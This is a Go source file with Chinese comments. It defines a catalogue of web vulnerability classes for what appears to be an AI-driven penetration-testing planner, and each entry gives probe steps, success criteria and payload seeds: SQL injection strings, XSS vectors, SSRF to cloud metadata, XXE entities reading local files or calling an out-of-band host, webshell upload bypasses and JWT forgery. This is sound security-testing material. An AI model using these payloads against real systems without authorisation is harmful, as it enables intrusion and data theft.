// Package vulnclass 是漏洞类目基线（VulnClass Matrix）的代码目录。
//
// 它解决的问题：planner 每次唤醒只能看到"资产 + 已有事实/漏洞"，缺一张
// "这类资产还有哪些漏洞类目没测、每类要怎么测、什么算测到"的清单，覆盖度因此
// 完全取决于模型当次的想象力。本包把这张清单变成可查询的数据。
//
// 定位：**提示性知识，不是自动探测器**。它只降低漏测，不替代真实触发——
// report_finding 仍要求可复现证据（见 agent/worker.go 的红线）。
package vulnclass

import "strings"

// Class 是一个漏洞类目的测试基线。
type Class struct {
	Key       string   // 稳定主键（小写），用于 findings.vulnclass 归一
	Name      string   // 中文名
	Aliases   []string // 常见别名/写法，用于把模型自由填写的 vulnclass 归一
	AppliesTo []string // 适用资产类型：root_domain/subdomain/ip/app/service/endpoint
	Prereq    string   // 前置条件（没有它就别浪费时间）
	Probe     []string // 探测步骤（按顺序）
	Oracles   []string // 成功判据（必须至少满足一条才算触发）
	Payloads  []string // payload 种子/变形方向
	Stop      string   // 终止条件（何时判定该类目已测透）
	Severity  string   // 典型危害等级提示
	CWE       string   // 参考 CWE
}

// All 返回内置类目表（顺序即建议的测试顺序：先面后点、先易后难）。
func All() []Class { return catalog }

var catalog = []Class{
	{
		Key:       "idor",
		Name:      "越权访问 / IDOR",
		Aliases:   []string{"idor", "越权", "越权访问", "权限绕过", "bola", "broken object level authorization", "水平越权", "垂直越权"},
		AppliesTo: []string{"app", "service", "endpoint"},
		Prereq:    "至少有一个已认证会话（登录态 / token / 邀请链接）；知道对象标识参数（id、uid、order_id、file_id…）。",
		Probe: []string{
			"用账号 A 的会话访问 A 自己的资源，记录基线响应。",
			"把对象标识改为属于账号 B 的值（同权限级），对比状态码/长度/字段。",
			"尝试无会话、过期会话、低权限角色访问同一接口（垂直越权）。",
			"对 ID 做遍历抽样（不批量，抽样 3-5 个即可判断是否可枚举）。",
		},
		Oracles: []string{
			"返回了他人数据（响应体含不属于当前账号的字段值）。",
			"状态码/长度与基线显著不同，且能稳定复现（同一请求重放两次一致）。",
			"低权限角色拿到了高权限接口的成功响应。",
		},
		Payloads: []string{"id±1", "id=0/-1", "UUID 替换为同租户另一 UUID", "删除 Authorization 头", "把 role/user_id 字段改为他人值"},
		Stop:     "同接口的读取/写入/删除三个动作各试过至少一种越权形态，且无会话访问也被拒；或接口不涉及对象标识。",
		Severity: "high",
		CWE:      "CWE-639",
	},
	{
		Key:       "sqli",
		Name:      "SQL 注入",
		Aliases:   []string{"sqli", "sql injection", "sql注入", "sql 注入", "盲注", "报错注入"},
		AppliesTo: []string{"app", "service", "endpoint"},
		Prereq:    "存在把用户输入拼进 SQL 的位置（查询参数、表单、JSON 字段、排序/分页参数、Header 中的租户标识）。",
		Probe: []string{
			"先确认参数确实影响查询：布尔对（' AND 1=1-- / ' AND 1=2--）、数字对（1 AND 1=1 / 1 AND 1=2）。",
			"看差异形态：报错（错误页/500/驱动字样）、布尔差异、时间差异、联合查询列数。",
			"盲注优先用时间延迟（sleep/pg_sleep）做最小验证，再考虑布尔盲注逐位。",
			"确认可注入后，只做只读证明（版本/当前库/一列无关数据）；不要 dump 业务表。",
		},
		Oracles:  []string{"布尔对出现稳定且可复现的响应差异（长度/状态/关键字）。", "时间对（sleep 0 vs sleep 3）出现稳定延迟差。", "报错信息泄露 SQL 片段/驱动错误。"},
		Payloads: []string{"' AND 1=1-- -", "' AND 1=2-- -", "1) AND SLEEP(3)-- -", "1 AND 1=1", "';SELECT 1-- -", "'||(SELECT 1)-- -"},
		Stop:     "每个可疑参数都验证过布尔/时间/报错三种 oracle 中的至少两种，且无回显时已用 OAST 排除带外。",
		Severity: "critical",
		CWE:      "CWE-89",
	},
	{
		Key:       "xss",
		Name:      "跨站脚本（反射/存储/DOM）",
		Aliases:   []string{"xss", "cross site scripting", "跨站", "跨站脚本", "反射型xss", "存储型xss"},
		AppliesTo: []string{"app", "service", "endpoint"},
		Prereq:    "存在把输入回显到 HTML/属性/JS/URL 的位置；或前端有把 location/hash/postMessage 写入 DOM 的 sink。",
		Probe: []string{
			"先打无害标记（如 zzz<x>），确认输入落点：HTML 文本、属性值、<script> 内、URL、CSS。",
			"按落点选编码绕过（HTML 实体、引号闭合、JS 字符串闭合、模板字面量）。",
			"存储型要确认持久化：写入后另开无痕会话/换账号访问同一页面。",
			"DOM 型看前端源码的 sink（innerHTML、document.write、eval、location 赋值）。",
		},
		Oracles:  []string{"载荷在响应中原样/按预期解码后出现在可执行上下文。", "无痕会话重访页面仍触发（存储型）。", "浏览器执行了注入脚本（可用 alert/console 标记验证）。"},
		Payloads: []string{"\"><svg onload=alert(1)>", "'><img src=x onerror=alert(1)>", "javascript:alert(1)", "{{constructor.constructor('alert(1)')()}}"},
		Stop:     "每个回显点都至少试过两种上下文编码，且存储型做过跨会话持久化验证；或确认输出已正确编码。",
		Severity: "high",
		CWE:      "CWE-79",
	},
	{
		Key:       "ssrf",
		Name:      "服务端请求伪造（SSRF）",
		Aliases:   []string{"ssrf", "服务端请求伪造", "server side request forgery", "盲ssrf"},
		AppliesTo: []string{"app", "service", "endpoint"},
		Prereq:    "存在由服务端发起请求的参数（url、uri、image、webhook、callback、feed、proxy、import）。",
		Probe: []string{
			"先指向自己控制的可观测地址（OAST），确认请求确实由服务端发出。",
			"再测内网地址（127.0.0.1、169.254.169.254、10/172.16/192.168），看回显或耗时/错误差异。",
			"尝试协议与变形：gopher、file、dict、@ 绕过、302 跳转、DNS 重绑定、十进制 IP。",
			"确认有回连后，只做最小证明（读一个无害端点/元数据字段），不横向扫描。",
		},
		Oracles:  []string{"OAST 收到来自目标服务端的请求（带 token 的 host/path）。", "内网地址返回与公网不同的响应/错误/耗时。", "通过 SSRF 读到了仅内网可见的内容。"},
		Payloads: []string{"http://<OAST>/ssrf", "http://127.0.0.1:80/", "http://169.254.169.254/latest/meta-data/", "http://2130706433/", "file:///etc/hostname"},
		Stop:     "所有疑似出网参数都做过 OAST 验证；无回连且内网探测也无差异才判该类目暂时无果。",
		Severity: "high",
		CWE:      "CWE-918",
	},
	{
		Key:       "ssti",
		Name:      "服务端模板注入（SSTI）",
		Aliases:   []string{"ssti", "模板注入", "server side template injection", "template injection"},
		AppliesTo: []string{"app", "service", "endpoint"},
		Prereq:    "存在把输入渲染进模板的参数（name、message、template、email 模板、报表/导出）。",
		Probe: []string{
			"先打数学探测：{{7*7}}、${7*7}、#{7*7}、<%= 7*7 %>，看是否被求值。",
			"按引擎选载荷（Jinja2/Twig/Freemarker/Velocity/Thymeleaf/Go template）。",
			"确认求值后只做无害证明（读环境变量名、版本号），不做命令执行除非目标明确允许。",
			"注意区分「只是回显」与「真被模板引擎求值」（前者是 XSS 面）。",
		},
		Oracles:  []string{"数学表达式被求值成结果（49），且重复请求稳定。", "引擎指纹出现在错误页/求值结果中。", "沙箱逃逸载荷返回了预期对象/字符串。"},
		Payloads: []string{"{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{7*'7'}}", "{{config}}"},
		Stop:     "每个可疑模板参数都试过至少两种引擎语法；已区分求值与纯回显。",
		Severity: "critical",
		CWE:      "CWE-1336",
	},
	{
		Key:       "xxe",
		Name:      "XML 外部实体注入（XXE）",
		Aliases:   []string{"xxe", "xml外部实体", "xml external entity"},
		AppliesTo: []string{"app", "service", "endpoint"},
		Prereq:    "接口接受 XML（Content-Type: application/xml、SOAP、SVG、DOCX/XLSX 上传、SAML）。",
		Probe: []string{
			"先确认解析器接受自定义 DOCTYPE：送一个带内部实体的 XML，看实体是否被展开。",
			"盲测：用外部实体指向 OAST，确认解析器发起了请求。",
			"有回显时读 /etc/hostname 这类无害文件；无回显走 OAST + 报错外带。",
			"试参数实体、XInclude 等绕过（当直接实体被禁）。",
		},
		Oracles:  []string{"内部实体被展开到响应中。", "OAST 收到来自目标的 DNS/HTTP 请求。", "报错信息包含文件内容或解析器路径。"},
		Payloads: []string{"<!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/hostname\">]><x>&e;</x>", "<!DOCTYPE x [<!ENTITY % p SYSTEM \"http://<OAST>/x\"> %p;]>", "<x xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/hostname\"/></x>"},
		Stop:     "所有 XML 入口都试过内部实体 + 外部实体（含 OAST）两种；或确认解析器禁用了 DTD。",
		Severity: "high",
		CWE:      "CWE-611",
	},
	{
		Key:       "upload",
		Name:      "任意文件上传 / 解析绕过",
		Aliases:   []string{"upload", "文件上传", "任意文件上传", "unrestricted upload", "上传绕过"},
		AppliesTo: []string{"app", "service", "endpoint"},
		Prereq:    "存在上传入口（头像、附件、导入、编辑器图片），且上传后路径可访问或有下载/预览接口。",
		Probe: []string{
			"先确认基线：允许的扩展名/MIME/大小，上传后返回的 URL 是否可直接访问。",
			"测扩展名绕过（.php5/.phtml/.jspx/大小写/双扩展/末尾点与空格/%00）。",
			"测内容校验绕过（改 Content-Type、加图片头 GIF89a、polyglot）。",
			"测路径穿越（filename=../../x）与覆盖已有文件。",
			"只有确认上传文件被服务端执行/解析，才算 getshell；仅可访问不算。",
		},
		Oracles:  []string{"上传的文件被服务端当作脚本执行（响应出现执行结果）。", "文件落到 Web 根且可被解析（非仅下载）。", "路径穿越写到了预期目录之外。"},
		Payloads: []string{"shell.php5", "shell.pHp", "shell.php.jpg", "shell.jsp;.jpg", "GIF89a<?php ... ?>", "filename=../../../../tmp/x"},
		Stop:     "扩展名/内容/路径三类绕过各试过至少一种；或确认上传目录不可执行且无解析入口。",
		Severity: "critical",
		CWE:      "CWE-434",
	},
	{
		Key:       "jwt",
		Name:      "JWT / 会话令牌缺陷",
		Aliases:   []string{"jwt", "token", "会话", "session", "认证绕过", "alg none", "弱密钥"},
		AppliesTo: []string{"app", "service", "endpoint"},
		Prereq:    "存在 JWT/Cookie 会话，且能拿到至少一个合法令牌与它的声明结构。",
		Probe: []string{
			"解出 header/payload，看 alg、kid、jku、声明里的角色与租户字段。",
			"测 alg=none、HS256 弱密钥（常见字典）、RS256→HS256 混淆。",
			"测声明篡改：role=admin、uid 改他人、exp 延长、租户字段替换。",
			"测无签名/签名不校验：改 payload 后签名段保持不变是否仍被接受。",
		},
		Oracles:  []string{"篡改后的令牌被服务端接受（返回 200/受保护数据）。", "alg=none 或弱密钥可签发被接受的令牌。", "角色/租户声明篡改后权限发生变化。"},
		Payloads: []string{"alg:none", "HS256 + 常见弱密钥", "payload.role=admin", "payload.uid=1", "删除签名段"},
		Stop:     "alg/密钥/声明三类篡改都试过；或确认服务端严格校验签名与声明。",
		Severity: "high",
		CWE:      "CWE-347",
	},
}

// ByKey 按主键取类目。
func ByKey(key string) (Class, bool) {
	k := strings.ToLower(strings.TrimSpace(key))
	for _, c := range catalog {
		if c.Key == k {
			return c, true
		}
	}
	return Class{}, false
}

// Normalize 把模型自由填写的 vulnclass（中文、别名、大小写、带空格）归一成主键。
// 识别不了时返回原值的小写形式与 false——调用方应把它当作"自定义类目"原样保留，
// 不要丢弃（自定义类目恰恰是 0day 的方向）。
func Normalize(raw string) (string, bool) {
	s := strings.ToLower(strings.TrimSpace(raw))
	if s == "" {
		return "", false
	}
	if _, ok := ByKey(s); ok {
		return s, true
	}
	compact := strings.NewReplacer(" ", "", "-", "", "_", "", "/", "").Replace(s)
	for _, c := range catalog {
		if strings.ReplaceAll(c.Key, "_", "") == compact {
			return c.Key, true
		}
		for _, a := range c.Aliases {
			if strings.ReplaceAll(strings.ToLower(a), " ", "") == compact {
				return c.Key, true
			}
		}
	}
	return s, false
}

// ForAssetType 返回适用于某资产类型的类目；空类型返回全部。
func ForAssetType(t string) []Class {
	t = strings.ToLower(strings.TrimSpace(t))
	if t == "" {
		return catalog
	}
	out := make([]Class, 0, len(catalog))
	for _, c := range catalog {
		for _, a := range c.AppliesTo {
			if a == t {
				out = append(out, c)
				break
			}
		}
	}
	return out
}

// Keys 返回全部主键（供测试/文档生成）。
func Keys() []string {
	out := make([]string, 0, len(catalog))
	for _, c := range catalog {
		out = append(out, c.Key)
	}
	return out
}
